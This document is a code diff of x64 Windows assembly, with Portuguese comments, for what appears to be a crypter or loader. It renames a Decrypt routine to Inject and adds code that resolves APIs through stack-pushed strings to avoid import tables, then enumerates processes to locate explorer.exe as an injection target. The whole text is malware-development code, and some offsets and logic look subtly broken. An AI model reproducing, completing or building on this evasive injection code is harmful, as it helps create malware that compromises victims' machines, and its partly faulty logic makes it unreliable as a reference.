@@ -41,7 +41,8 @@ WinMain:
         call codeModification
         call Encrypt
         call CriaArquivoEncriptado 
-        call Decrypt
+        call Inject
+
         
         
         Encrypt:
@@ -493,8 +494,9 @@ WinMain:
                 mov r8, rbx;              # Copia o endereco base da ntdll para o registrador R8
         ret
 
-        Decrypt:
+        Inject:
                 call Locate_kernel32
+                mov rdi,r8
                 ;Lookup VirtualAlloc
                 mov rax, "lloc"
                 push rax
@@ -532,5 +534,150 @@ WinMain:
                         inc rcx
                         cmp rcx, [TamArqTarget]
                         jne LoopDecrypt
-        ret                           
+
+        get_process_pid:
+                push rbp
+                sub rsp, 0x160
+                lea rbp, [rsp+0x80]
+
+                ;Lookup CreateToolhelp32Snapshot
+                mov rax, "Snapshot"
+                push rax
+                mov rax, "olhelp32"
+                push rax
+                mov rax, "CreateTo"
+                push rax
+                mov [rsp+24], dword 0x00
+                
+             
+             
+
+                lea rdx, [rsp]
+                mov rcx, rdi
+                sub rsp, 0x30
+                call r14
+                mov r12,rax
+                add rsp, 0x30
+        
+                ;call CreateToolhelp32Snapshot
+                mov edx, 0x00
+                mov ecx, 0x02
+                call r12
+                mov [rbp+0xD8], rax
+                add rsp, 0x30
+                add rsp, 0x10
+
+
+                ; pega o endereco LoadLibraryA usando GetProcAddress
+                mov rcx, 0x41797261;  
+                push rcx;  
+                mov rcx, 0x7262694c64616f4c;  
+                push rcx;  
+                mov rdx, rsp;                      # joga o ponteiro da string LoadLibraryA para RDX
+                mov rcx, rdi;                       # Copia o endereço base da Kernel32  para RCX
+                sub rsp, 0x30;                     # Make some room on the stack
+                call r14;                          # Call GetProcessAddress
+                add rsp, 0x30;                     # Remove espaço locdo na pilha
+                add rsp, 0x10;                     # Remove a string alocada de  LoadLibrary 
+                mov rsi, rax;                      # Guarda o endereço de loadlibrary em RSI                
+
+                ; Load msvcrt.dll
+                mov rax, "ll"
+                push rax
+                mov rax, "msvcrt.d"
+                push rax
+                mov rcx, rsp
+                sub rsp, 0x30
+                call rsi
+                mov r15,rax
+                add rsp, 0x30
+                add rsp, 0x10
+
+
+
+                ;Lookup strcmp
+                mov rax, "strcmp"
+                push rax
+                lea rdx, [rsp]
+                mov rcx, r15
+                sub rsp, 0x30
+                call r14
+                mov r12,rax
+                add rsp, 0x30
+
+                ;lookup Process32Next
+                mov rax, "2Next"
+                push rax
+                mov rax, "Process3"
+                push rax
+                lea rdx, [rsp]
+                mov rcx, rdi
+                sub rsp, 0x30
+                call r14
+                mov r13,rax
+                add rsp, 0x30
+
+                call Locate_ntdll
+
+                ;Lookup ZwClose
+                mov rax, "ZwClose"
+                push rax
+                lea rdx, [rsp]
+                mov rcx, r8
+                sub rsp, 0x30
+                call r14
+                mov r10,rax
+                add rsp, 0x30
+
+                mov rdi, ".exe"
+                push rdi
+                mov rdi, "explorer"
+                push rdi
+                mov [rbp+0xF0], rsp
+
+              
+                mov eax, 0x130
+                mov [rbp-0x60], eax
+        ProcessNext:        
+                lea rax, [rbp-0x60]
+                add rax, 0x2c
+                mov rdx,[rbp+0xF0]
+                mov rcx, rax
+                call r12
+                test eax,eax
+                jne FoundName
+                        mov eax, [rbp-0x58]
+                        jmp FimGetPid
+                        FoundName:
+                                lea rdx, [rbp-0x60]
+                                mov rax, [rbp+0xD8]
+                                mov rcx,rax
+                                call r13
+                                test eax,eax
+                                setne al
+                                test al,al
+                                jne ProcessNext
+                                mov rax,[rbp-0xD8]
+                                mov rcx,rax
+                                call r13
+
+
+                FimGetPid:
+                add rsp, 0x160
+                add rsp, 0x10 
+
+                call Locate_kernel32
+                ;lookup ExitProcess
+                mov rax, "ess"
+                push rax
+                mov rax, "ExitProc"
+                push rax
+                lea rdx, [rsp]
+                mov rcx, r8
+                sub rsp, 0x30
+                call r14
+                mov r12 ,rax
+                
+                call r12
+                                              
 ret
